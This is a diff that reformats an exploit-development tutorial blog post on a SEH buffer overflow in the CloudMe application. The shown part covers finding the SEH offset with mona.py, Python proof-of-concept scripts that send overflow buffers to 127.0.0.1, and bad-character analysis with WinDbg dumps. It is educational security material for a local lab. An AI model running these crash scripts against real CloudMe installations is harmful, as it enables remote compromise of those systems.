@@ -183,6 +183,7 @@ Invalid exception stack at 41414141
 <hr />
 <h3>2. Searching the Offset</h3>
 <p align="justify">At this point we need to check how far we are able to write and overwrite <b>SEH</b>. In order to do this we will attempt to generate 5000 byte pattern using <b>mona.py</b> as follows. First, create an output folder form mona inside logs folder. All the generated patterns and other data such as ROP chains and bad chars generated from <b>mona.py</b> will be saved there.</p>
+
 ```
 !mona config -set workingfolder c:\logs\%p
 ```
@@ -208,7 +209,11 @@ It's better to open c:\logs\CloudMe\pattern.txt and copy the pattern from the fi
 ```
 
 <p align="justify">Now that we have generated the pattern, we are able to find the exact offset where the application crashes. The following PoC script will do that.</p>
-<pre>import socket<br />import sys
+
+```python
+
+import socket 
+import sys
 
 target = "127.0.0.1"
 
@@ -286,15 +291,21 @@ try:
     s.send(payload)
 except Exception as e:
     print(sys.exc_value)
-</pre>
+```
+
 <p align="justify">After we run the python script above, we see that the <b>nseh</b> and <b>seh</b> values are changed</p>
-<pre>0:000&gt; !exchain
+
+``` 
+0:000> !exchain
 0022d908: USER32!___PchSym_  (USER32+0x83577)+0 (77433577)
 Invalid exception stack at 43347743
-</pre>
+```
+
 <p align="justify">As shown above, the <b>nseh</b> was overwritten with the pattern <b>43347743</b> and <b>SEH</b> was overwritten with the pattern <b>77433577</b>. However, because DEP is enabled, we can not simply pivot to <b>nseh</b> and run instructions from the stack. At this point we are only interested in the offset of <b>SEH</b>. Using <b>mona.py</b> we will calculate the offset of <strong>SEH</strong> as follows</p>
-<pre>0:000&gt; !load pykd.pyd
-0:000&gt; !py mona pattern_offset 77433577
+
+```
+0:000> !load pykd.pyd
+0:000> !py mona pattern_offset 77433577
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_offset 77433577
@@ -308,10 +319,14 @@ Looking for wC5w in pattern of 500000 bytes
  - Pattern wC5w not found in cyclic pattern (lowercase)  
 
 [+] This mona.py action took 0:00:00.375000
-</pre>
+```
+
 <p align="justify">So, the offset that causes the application to crash has been found and now we can control <b>SEH</b> by creating a junk buffer of <b>2236</b> bytes. Now, lets update the previous PoC</p>
-<pre>import socket
-import sys<br />
+
+```python
+
+import socket
+import sys
 target = "127.0.0.1"
 
 payload_size = 2236
@@ -328,9 +343,12 @@ try:
     s.send(payload)
 except Exception as e:
     print(sys.exc_value)
-</pre>
+```
+
 <p align="justify">When we run the script above, the following chain shows that we now control the exception handler</p>
-<pre>(794.d1c): Access violation - code c0000005 (first chance)
+
+```
+(794.d1c): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 eax=00000001 ebx=41414141 ecx=762498da edx=0000008a esi=41414141 edi=41414141
@@ -340,14 +358,21 @@ cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
 0:000&gt; !exchain
 0022d908: 42424242
 Invalid exception stack at 41414141
-</pre>
+```
+
 <hr />
 <h3>3. The Bad Characters</h3>
 <p align="justify">At this point, before moving further to exploitation, its time to search for bad characters. First, we will use a hex character generator to generate all the 256 ascii hex characters. A nice hex character generator can be cloned from <a href="https://github.com/cytopia/badchars">here</a>. We can also install badchars in our Kali machine as follows</p>
-<pre>pip3 install badchars
-</pre>
+
+```
+pip3 install badchars
+```
+
 <p align="justify">Then we will generate the hex chars as follows</p>
-<pre>root@kali:/home/kali# badchars -f python
+
+
+```
+root@kali:/home/kali# badchars -f python
 badchars = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
@@ -366,9 +391,13 @@ badchars = (
   "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
   "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
-</pre>
+```
+
 <p align="justify">We will use the hex chars above to identify badchars in our target. In order to do that, we will use the following python script</p>
-<pre>import sys
+
+```python
+
+import sys
 import socket
 
 target="127.0.0.1"
@@ -405,41 +434,47 @@ try:
 except Exception as e:
   print(sys.exc_value)
 
-</pre>
+```
+
 <p align="justify">After we run the script above, we can then explore the dump on the stack in order to search for bad characters.</p>
-<pre>0:000&gt; dd esp L 500
+
+```
+0:000> dd esp L 500
 [..snip..]
 0022d8c0  41414141 41414141 41414141 41414141
 0022d8d0  41414141 41414141 41414141 41414141
 0022d8e0  41414141 41414141 41414141 41414141
 0022d8f0  41414141 41414141 41414141 41414141
 0022d900  41414141 41414141 41414141 42424242
-<span style="color:#33cccc;">0022d910</span><span style="color:#ff0000;">  04030201 08070605 0c0b0a09 100f0e0d
-</span>0022d920<span style="color:#ff0000;">  14131211 18171615 1c1b1a19 201f1e1d
-</span>0022d930<span style="color:#ff0000;">  24232221 28272625 2c2b2a29 302f2e2d
-</span>0022d940<span style="color:#ff0000;">  34333231 38373635 3c3b3a39 403f3e3d
-</span>0022d950<span style="color:#ff0000;">  44434241 48474645 4c4b4a49 504f4e4d
-</span>0022d960<span style="color:#ff0000;">  54535251 58575655 5c5b5a59 605f5e5d
-</span>0022d970<span style="color:#ff0000;">  64636261 68676665 6c6b6a69 706f6e6d
-</span>0022d980<span style="color:#ff0000;">  74737271 78777675 7c7b7a79 807f7e7d
-</span>0022d990<span style="color:#ff0000;">  84838281 88878685 8c8b8a89 908f8e8d
-</span>0022d9a0<span style="color:#ff0000;">  94939291 98979695 9c9b9a99 a09f9e9d
-</span>0022d9b0<span style="color:#ff0000;">  a4a3a2a1 a8a7a6a5 acabaaa9 b0afaead
-</span>0022d9c0<span style="color:#ff0000;">  b4b3b2b1 b8b7b6b5 bcbbbab9 c0bfbebd
-</span>0022d9d0<span style="color:#ff0000;">  c4c3c2c1 c8c7c6c5 cccbcac9 d0cfcecd
-</span>0022d9e0<span style="color:#ff0000;">  d4d3d2d1 d8d7d6d5 dcdbdad9 e0dfdedd
-</span>0022d9f0<span style="color:#ff0000;">  e4e3e2e1 e8e7e6e5 ecebeae9 f0efeeed
-</span>0022da00<span style="color:#ff0000;">  f4f3f2f1 f8f7f6f5 fcfbfaf9 </span>43<span style="color:#ff0000;">fffefd</span>
+0022d910  04030201 08070605 0c0b0a09 100f0e0d
+0022d920  14131211 18171615 1c1b1a19 201f1e1d
+0022d930  24232221 28272625 2c2b2a29 302f2e2d
+0022d940  34333231 38373635 3c3b3a39 403f3e3d
+0022d950  44434241 48474645 4c4b4a49 504f4e4d
+0022d960  54535251 58575655 5c5b5a59 605f5e5d
+0022d970  64636261 68676665 6c6b6a69 706f6e6d
+0022d980  74737271 78777675 7c7b7a79 807f7e7d
+0022d990  84838281 88878685 8c8b8a89 908f8e8d
+0022d9a0  94939291 98979695 9c9b9a99 a09f9e9d
+0022d9b0  a4a3a2a1 a8a7a6a5 acabaaa9 b0afaead
+0022d9c0  b4b3b2b1 b8b7b6b5 bcbbbab9 c0bfbebd
+0022d9d0  c4c3c2c1 c8c7c6c5 cccbcac9 d0cfcecd
+0022d9e0  d4d3d2d1 d8d7d6d5 dcdbdad9 e0dfdedd
+0022d9f0  e4e3e2e1 e8e7e6e5 ecebeae9 f0efeeed
+0022da00  f4f3f2f1 f8f7f6f5 fcfbfaf9 43fffefd
 0022da10  43434343 43434343 43434343 43434343
 0022da20  43434343 43434343 43434343 43434343
 0022da30  43434343 43434343 43434343 43434343
 0022da40  43434343 43434343 43434343 43434343
 0022da50  43434343 43434343 43434343 43434343
 [..snip..]
-</pre>
+```
+
 <p align="justify">The dump above shows the hex character set we have sent to the vulnerable application that starts from <b>0x0022d910</b> until <b>0x0022da0b</b> . Now its time to perform the analysis. If we take a closer look at at the character set above we can say that we might not have bad characters, but we must still investigate further in order to be sure. We can do this using <b>mona.py</b> directly from <b>windbg</b>. Lets generate the badchars with <b>mona.py</b> as follows</p>
-<pre>0:000&gt; !load pykd.pyd
-0:000&gt; !py mona bytearray -cpb '\x00' 
+
+```
+0:000> !load pykd.pyd
+0:000> !py mona bytearray -cpb '\x00' 
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py bytearray -cpb '\x00'
@@ -461,7 +496,8 @@ Done, wrote 255 bytes to file c:\logs\CloudMe\bytearray.txt
 Binary output saved in c:\logs\CloudMe\bytearray.bin
 
 [+] This mona.py action took 0:00:00.047000
-</pre>
+```
+
 <p align="justify">As we see above, we have already set the log file and we can also see the ascii hex characters generated from <b>mona.py</b>. Also, it is worth to mention that we don't need to include the '\x00' character in our character set, because it could cut off the rest of the characters, as it could be acting as a null terminator. Nevertheless, we can see if it is considered a bad character afterwards.</p>
 <p align="justify">Now, we can use the following command to compare the character set generated with <b>mona.py</b>, with the character set we have sent to the vulnerable <b>CloudMe</b> application.</p>
 <pre>0:000&gt; !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
